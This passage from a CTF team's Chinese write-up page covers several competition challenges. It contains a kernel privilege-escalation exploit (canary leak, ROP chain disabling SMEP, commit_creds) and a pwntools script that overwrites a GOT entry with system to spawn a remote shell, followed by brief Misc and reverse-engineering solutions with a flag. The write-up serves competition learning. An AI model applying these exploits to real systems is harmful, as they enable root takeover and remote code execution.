</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=kt>long</span> <span class=o>*</span><span class=n>buf</span><span class=o>=</span><span class=p>(</span><span class=kt>long</span> <span class=kt>long</span> <span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>buf</span><span class=o>==</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;malloc error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mh>0x30002</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=kt>long</span> <span class=n>ret</span><span class=o>=</span><span class=n>buf</span><span class=p>[</span><span class=mh>0x2a</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=kt>long</span> <span class=n>base</span> <span class=o>=</span> <span class=n>ret</span> <span class=o>-</span> <span class=mh>0xffffffff81219218</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=kt>long</span> <span class=n>canary</span><span class=o>=</span><span class=n>buf</span><span class=p>[</span><span class=mh>0x28</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=kt>long</span> <span class=n>poprdi</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=mh>0xffffffff8109054d</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=kt>long</span> <span class=n>rdi2cr4</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=mh>0xffffffff81004d70</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>prepare_kernel_cred</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=mh>0xffffffff810a1820</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>commit_creds</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=mh>0xffffffff810a1430</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>user_stack</span><span class=o>=&amp;</span><span class=n>poprdi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%p</span><span class=se>\n</span><span class=s>%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>canary</span><span class=p>,</span> <span class=n>ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>padding</span><span class=p>,</span> <span class=sc>&#39;a&#39;</span><span class=p>,</span> <span class=mh>0x140</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>join_str</span><span class=p>(</span><span class=n>padding</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>join_data</span><span class=p>(</span><span class=n>canary</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>join_data</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span> <span class=c1>// rbp
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>join_data</span><span class=p>(</span><span class=n>poprdi</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>join_data</span><span class=p>(</span><span class=mh>0x6f0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>join_data</span><span class=p>(</span><span class=n>rdi2cr4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>join_data</span><span class=p>(</span><span class=n>user_stack</span><span class=o>+</span><span class=mh>0x200</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>join_data</span><span class=p>(</span><span class=o>&amp;</span><span class=n>get_root</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mh>0x30001</span><span class=p>,</span> <span class=n>payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>0xffffffff81219218
</span></span></span><span class=line><span class=cl><span class=cm>0xffffffff81004d70 : mov cr4, rdi ; pop rbp ; ret
</span></span></span><span class=line><span class=cl><span class=cm>0xffffffff8109054d : pop rdi ; ret
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span></code></pre></td></tr></table></div></div><p>利用musl-gcc可以编译出很小的静态链接程序</p><h3 id=bjut>bjut</h3><p>索引可以为负数，通过<code>Elf64_Rela</code>结构体的GOT表值来泄漏libc与修改GOT表，改free为system执行submit即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># encoding:utf-8</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>file</span> <span class=o>=</span> <span class=s1>&#39;./hw&#39;</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>e</span><span class=o>.</span><span class=n>libc</span>
</span></span><span class=line><span class=cl><span class=n>rlibc</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>ip</span> <span class=o>=</span> <span class=s1>&#39;121.37.167.199&#39;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=s1>&#39;9997&#39;</span>
</span></span><span class=line><span class=cl><span class=n>debug</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dbg</span><span class=p>(</span><span class=n>code</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>debug</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>debug</span> <span class=o>==</span> <span class=kc>False</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=n>local</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>p</span><span class=p>,</span> <span class=n>libc</span><span class=p>,</span> <span class=n>debug</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>local</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>debug</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>debug</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>rlibc</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>rlibc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>se</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sea</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rc</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mf>0.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rn</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shell</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>un64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>un32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>run</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># -1879</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;20&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;/bin/sh&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>modify</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;-1879&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sea</span><span class=p>(</span><span class=s2>&#34;:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dele</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;4&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;-1879&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s2>&#34;hw:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>un64</span><span class=p>(</span><span class=n>rn</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># dbg(&#34;b*0x0000000000401487&#34;)</span>
</span></span><span class=line><span class=cl><span class=n>modify</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>dbg</span><span class=p>(</span><span class=s2>&#34;b*0x00000000004016DA&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;5&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shell</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=misc>Misc</h2><h3 id=2019-ncov>2019-nCoV</h3><h3 id=简单misc>简单MISC</h3><p>解压photo.jpg得到一串摩尔斯码，解码得到flag.zip的解压密码，再解base64</p><h3 id=隐藏的信息>隐藏的信息</h3><p>压缩包伪加密，解压发现音频，结尾和开头处有电话按键音，为DTMF信号，分析一下频率就好最后得到号码为187485618521,二维码那个图片结尾16进制说flag用base64提交</p><h2 id=rev>Rev</h2><h3 id=fxck>fxck!</h3><p>题目有两个重要函数一个是400C3A和400A56。</p><p>其中400C3A为变字母表的base58,400a56为brainfack，不过400a56的结果已经打印出来，我们调试即可。调试出结果，将其换表后在进行base58解密</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>base_now</span><span class=o>=</span><span class=s2>&#34;ABCDEFGHJKLMNPQRSTUVWXYZ123456789abcdefghijkmnopqrstuvwxyz&#34;</span>
</span></span><span class=line><span class=cl><span class=n>base_init</span><span class=o>=</span><span class=s2>&#34;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>clear</span><span class=o>=</span><span class=s2>&#34;4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe&#34;</span>
</span></span><span class=line><span class=cl><span class=n>c</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>clear</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span><span class=o>=</span><span class=n>base_now</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>clear</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span><span class=o>+=</span><span class=n>base_init</span><span class=p>[</span><span class=n>b</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>base58不止改了码表开头根据长度生成了8bit放在开头，根据题目提示长度是42，所以生成的8bit是0xe0，然后码表解密后替换
所以你只要长度为42开头都是S
但是题目有毛病后来出题人改了
第二个函数就是单纯生成正确密文
4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe
然后直接比较
但有趣的是，正确密文没有放对应0xe0，可能是出题人改题目时间比较紧就放低难度了把
总之很无语
瞬间变成签到题
flag{63510cf7-2b80-45e1-a186-21234897e5cd}
然后你会发现运行程序输入这个flag还是过不了check
但是问题不大，比起“密文破译”里的迷惑行为这个还能写写</p><h3 id=cycle-graph>cycle graph</h3><p>调试即可出，类似明文比较只不过要过最后一个check只有一个答案</p><h3 id=天津垓>天津垓</h3><p>反调试俩个
smc
elgamal算法求逆元即可</p><h3 id=easyparser>easyparser</h3><p>bss段存放输入，因为会录入回车要进去修改一下
判断格式后进行简单操作验证（(input^0x63) &#171; (v112 & 0x3F)）
每次都有个check_sign来判断是否不相等
爆破即可</p><h2 id=crypto>Crypto</h2><div class=blog-tags><a href=https://su-team.cn/tags/otherctf/>OtherCTF</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/tfcctf-2025-su-wu/>2025 TFCCTF SU WriteUp</a></li><li><a href=/post/zer0ptsctf-2023-su-wu/>2023 Zer0ptsCTF SU Writeup</a></li><li><a href=/post/xhlj-2021-su-wu/>2021年西湖论剑线上赛 SU Write-up</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/bytectf-2019-su-wu/ data-toggle=tooltip data-placement=top title="ByteCTF 2019 SU Write Up">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/wmctf-2020-su-wu/ data-toggle=tooltip data-placement=top title="WMCTF 2020 SU Write-Up">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>